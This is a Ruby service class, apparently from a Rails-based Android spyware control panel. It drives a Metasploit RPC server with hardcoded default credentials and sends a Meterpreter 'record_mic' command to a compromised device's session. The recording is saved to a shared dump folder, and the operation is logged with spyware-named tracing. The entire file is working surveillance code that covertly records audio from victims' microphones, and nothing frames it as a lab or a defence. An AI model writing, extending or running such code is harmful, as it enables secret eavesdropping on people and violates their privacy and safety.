class AudioRecorderService
  include MsfInstrumentation::ApplicationControllerMixin

  SHARED_MSF_PATH = '/root/files/dumps/microphone_recs'
  SHARED_RAILS_PATH = '/app/android-spyware/files/dumps/microphone_recs'

  def initialize(session_id)
    @session_id = session_id
    @client = get_msf_rpc_client
  end

  def record(duration: 10)
    setup_directories
    
    filename = "audio_#{Time.now.strftime('%Y%m%d_%H%M%S')}_#{@session_id}.wav"
    msf_file_path = "#{SHARED_MSF_PATH}/#{filename}"
    rails_file_path = "#{SHARED_RAILS_PATH}/#{filename}"

    Rails.logger.info("🎙️ Starting recording for #{duration}s on session #{@session_id}")
    Rails.logger.info("📂 Target Path: #{msf_file_path}")

    # Use tracing for the operation
    SpywareTracing.trace_msf_operation('record_mic', { session_id: @session_id, duration: duration }) do |span|
      begin
        # Execute recording command
        # -d: duration
        # -f: file path
        response = @client.call('session.meterpreter_write', @session_id, "record_mic -d #{duration} -f #{msf_file_path}")
        
        # Wait for recording + buffer
        sleep(duration + 2)
        
        # Verify file exists on Rails side (Shared Volume Magic)
        if File.exist?(rails_file_path)
          span.set_attribute('recording.status', 'success')
          span.set_attribute('recording.size', File.size(rails_file_path))
          return { success: true, path: rails_file_path, filename: filename }
        else
          span.set_attribute('recording.status', 'failed_file_missing')
          return { success: false, error: "File not found at #{rails_file_path}" }
        end

      rescue => e
        SpywareTracing.record_error(span, e, 'record_mic')
        Rails.logger.error("❌ Audio recording failed: #{e.message}")
        return { success: false, error: e.message }
      end
    end
  end

  private

  def setup_directories
    # Ensure directory exists (this might need to be run in MSF container too if not shared root)
    # The 'files' dir is shared, so subdirs should be visible if permissions allow.
    FileUtils.mkdir_p(SHARED_RAILS_PATH) unless Dir.exist?(SHARED_RAILS_PATH)
  end

  def get_msf_rpc_client
    # Re-use the mixin logic or instantiate new
    # Better to extract this to a common factory, but for now:
    Msf::RPC::Client.new(
      host: ENV['MSF_RPC_HOST'] || 'metasploit',
      port: ENV['MSF_RPC_PORT'] || 3333,
      uri: '/api/',
      ssl: true,
      username: ENV['MSF_RPC_USER'] || 'cool',
      password: ENV['MSF_RPC_PASSWORD'] || 'looc'
    )
  end
end
